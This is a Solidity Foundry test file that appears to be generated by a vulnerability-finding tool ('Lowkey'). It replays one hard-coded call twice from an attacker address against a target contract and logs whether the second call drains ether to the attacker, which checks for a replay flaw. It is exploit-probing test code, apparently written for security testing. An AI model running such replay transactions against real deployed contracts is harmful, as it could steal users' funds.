// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

contract LowkeyBreakRepeat is Test {
    address constant TARGET = address(0x5fbdb2315678afecb367f032d93f642f64180aa3);
    address constant ATTACKER = address(0xBEEF000000000000000000000000000000000042);

    function test_break_repeat() public {
        bytes memory data = hex"fef3a300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000000000000000000000000000000000000000000001";
        vm.deal(ATTACKER, 100 ether);

        uint256 targetBefore = TARGET.balance;
        uint256 attackerBefore = ATTACKER.balance;

        vm.prank(ATTACKER);
        (bool first, ) = TARGET.call{value: 0}(data);

        uint256 targetMid = TARGET.balance;
        uint256 attackerMid = ATTACKER.balance;

        vm.prank(ATTACKER);
        (bool second, ) = TARGET.call{value: 0}(data);

        uint256 targetAfter = TARGET.balance;
        uint256 attackerAfter = ATTACKER.balance;

        uint256 secondGain = attackerAfter > attackerMid ? attackerAfter - attackerMid : 0;
        uint256 secondOutflow = targetMid > targetAfter ? targetMid - targetAfter : 0;

        console2.log("LOWKEY_BREAK_FAMILY", "replay");
        console2.log("FIRST_SUCCESS", first);
        console2.log("SECOND_SUCCESS", second);
        console2.log("SECOND_ATTACKER_GAIN", secondGain);
        console2.log("SECOND_TARGET_OUTFLOW", secondOutflow);

        if (second && secondGain > 0 && secondOutflow > 0) {
            console2.log("LOWKEY_BREAK", true);
        } else {
            console2.log("LOWKEY_BREAK", false);
        }

        // Never make the test itself fail on a mere candidate: Lowkey parses the
        // observations and decides whether the behavioral break condition is met.
        targetBefore; attackerBefore;
    }
}
